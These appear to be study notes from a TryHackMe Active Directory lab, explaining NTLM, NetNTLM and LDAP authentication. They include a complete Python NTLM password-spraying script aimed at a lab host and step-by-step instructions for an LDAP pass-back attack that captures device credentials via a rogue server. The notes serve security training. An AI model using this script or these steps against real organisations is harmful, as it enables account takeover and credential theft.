## Part 1: NTLM vs. NetNTLM — The Critical Distinction

### NTLM

- **Full name**: NT LAN Manager
- **What it is**: Microsoft's authentication **protocol**
- **Purpose**: Prove a user knows the password without sending it in plaintext

### NetNTLM

- **What it is**: The **network challenge-response exchange** produced when NTLM is used over the network
- **Not the same** as an NT hash

```
NTLM = authentication protocol
NetNTLM = network challenge-response exchange using NTLM
```

### Flow

```
Password
    │
    ▼
 NT hash  (password-derived credential material)
    │
    │ used in
    ▼
NTLM authentication
    │
    ▼
Challenge + Response
    │
    ▼
 NetNTLM
```

### Comparison Table

| Term | What It Means |
|---|---|
| **NTLM** | Microsoft's authentication protocol |
| **NT hash** | Hash derived from a user's password (often casually called "NTLM hash") |
| **NetNTLM** | Network challenge-response authentication exchange using NTLM |
| **NetNTLMv2** | Later version of the network challenge-response mechanism |

### Two Situations You'll Encounter in AD Labs

**Situation A — You obtain an NT hash** (e.g., from SAM dump):

```
8846f7eaee8fb117ad06bdd830b7586c
```

That's an **NT hash** — password-derived credential material.

**Situation B — You capture network authentication** (e.g., via Responder):

```
USER::DOMAIN:challenge:response:...
```

That's **NetNTLM material** — part of the network authentication exchange.

> [!TIP]
> **Memory trick**: NTLM is the protocol; NetNTLM is what you see when that protocol performs challenge-response authentication over the network.

## NetNTLM in Active Directory Services

NTLM can be used for authentication via a challenge-response scheme called **NetNTLM**. Services that use NetNTLM can be exposed to the internet:

- **Exchange / OWA** — Outlook Web App login portals
- **RDP** — Remote Desktop Protocol
- **VPN endpoints** — integrated with AD
- **Web applications** — internet-facing, using Windows Authentication

NetNTLM allows the application to act as a **middleman** between the client and AD. All authentication material is forwarded to the Domain Controller as a challenge. The application authenticates **on behalf of the user**, preventing it from storing AD credentials.

## Part 2: Password Spraying Attack

### Concept

| Technique | Approach |
|---|---|
| **Brute-Force** | Many passwords against a single username |
| **Password Spraying** | One password against many usernames |

Password spraying avoids triggering account lockouts while identifying accounts using default/weak credentials.

### Scenario

OSINT reveals the organisation's initial onboarding password is `Changeme123`. Users should change it, but many don't.

### Target

Navigate to: `http://ntlmauth.za.tryhackme.com/`

This prompts for Windows Authentication (NTLM) credentials:

![](attachments/Pasted%20image%2020261005111954.png)

### The Password Spraying Script

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])
```

**How the script works**: For each username in the textfile, it sends a GET request with NTLM authentication. HTTP `200` = valid credentials, HTTP `401` = invalid.

## Part 3: LDAP Bind Credentials

### What Is LDAP?

- **Full name**: Lightweight Directory Access Protocol
- **What it is**: A protocol to **communicate with and query** a directory (such as Active Directory)
- **Not** an authentication protocol like Kerberos or NTLM

```
LDAP = "Talk to / query AD"
Kerberos = "Ticket-based authentication"
NTLM = "Challenge-response authentication"
DNS = "Find the machine"
SMB = "Access network resources"
```

### AD Directory Structure (LDAP Notation)

```
DC=za,DC=tryhackme,DC=com
│
├── OU=Users
│    ├── CN=Alice
│    └── CN=Bob
│
├── OU=Computers
│    └── CN=PC01
│
└── OU=Servers
     └── CN=DC01
```

### LDAP Retrieves AD Objects

```
sAMAccountName
distinguishedName
memberOf
objectClass
description
userPrincipalName
```

### LDAP vs Kerberos vs NTLM

| Technology | Main Purpose |
|---|---|
| **LDAP** | Communicate with / query the directory |
| **Kerberos** | Authentication using tickets |
| **NTLM** | Authentication using challenge-response |
| **DNS** | Resolve names to IP addresses |
| **SMB** | File/printer sharing and network communication |

```
             Active Directory
                   │
            Domain Controller
                   │
       ┌───────────┼───────────┐
       │           │           │
      LDAP      Kerberos      DNS
       │           │           │
  Query AD    Authenticate   Resolve
   objects       users        names
```

### Ports to Remember

```
LDAP       → TCP 389
LDAPS      → TCP 636
Kerberos   → TCP/UDP 88
DNS        → TCP/UDP 53
SMB        → TCP 445
```

### LDAP Authentication vs NTLM Authentication

- With NTLM: credentials are **never sent directly** — the NetNTLM challenge-response protocol is used.
- With LDAP: the application **directly verifies** user credentials by performing an LDAP bind to the DC.

LDAP authentication is common with **third-party (non-Microsoft) applications**:

- GitLab, Jenkins
- Custom web applications
- Printers, VPNs

![](attachments/Pasted%20image%2020261005164615.png)

> [!WARNING]
> Because LDAP authentication requires direct credentials, config files for these services frequently store AD credentials in **plaintext**.

### LDAP Authentication Flow

1. User submits credentials to a third-party app (e.g., network printer).
2. The app authenticates **itself** to the DC via an LDAP bind using its own AD service credentials.
3. DC returns a bind response.
4. The app executes an LDAP search to verify the user exists.
5. DC returns the user's search response.
6. The app sends a second LDAP bind with the **user's** credentials.
7. If valid, the DC returns success → user is authenticated.

---

### LDAP Pass-Back Attack

An attack against network devices (printers, etc.) when you gain access to the device's configuration interface:

1. Access the device's web admin panel (often using default creds like `admin:admin`).
2. The LDAP config shows a pre-filled username and a masked password (`***`).
3. **Modify the LDAP server IP** from the legitimate DC to your **attacker-controlled rogue LDAP server**.
4. Trigger a test authentication or service restart.
5. The device sends an LDAP bind with its stored credentials to **your** rogue server.
6. Capture the plaintext AD credentials.

> [!TIP]
> This requires setting up a rogue LDAP daemon on your attacking host to intercept the bind request.
